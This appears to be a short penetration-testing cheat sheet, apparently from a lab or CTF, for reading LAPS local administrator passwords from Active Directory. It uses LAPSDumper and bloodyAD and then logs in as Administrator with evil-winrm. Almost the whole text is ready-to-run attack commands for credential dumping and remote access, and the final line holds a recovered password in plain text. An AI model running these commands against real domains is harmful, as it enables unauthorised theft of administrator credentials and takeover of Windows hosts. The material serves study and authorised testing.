#### Using laps.py
```shell
wget https://github.com/n00py/LAPSDumper/raw/refs/heads/main/laps.py
```
#### Using LAPSDumper from Linux to Read the LAPS Password
```shell
python3 laps.py -u <USER> -p <PASSWORD> -l <TARGET-IP> -d Domain.local
```
<img width="1808" height="137" alt="Pasted image 20260101213236" src="https://github.com/user-attachments/assets/d8f52569-2420-41aa-823e-ea4787025142" />
#### **Not to forget** Username that will be used on laps password is **Administrator**

---
#### Using `bloodyAD`
```shell
bloodyAD --host <TARGET-IP> -d domain.local -u <USER> -p <PASSWORD> get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
<img width="1858" height="89" alt="Pasted image 20260101213108" src="https://github.com/user-attachments/assets/79848297-6ec7-4b4a-907a-53e4cd7bde11" />

---
#### Access
```shell
evil-winrm -S -i <TARGET-IP> -u Administrator -p "6vf8f0T4a+2[@Mu1[6g66pHj"
```
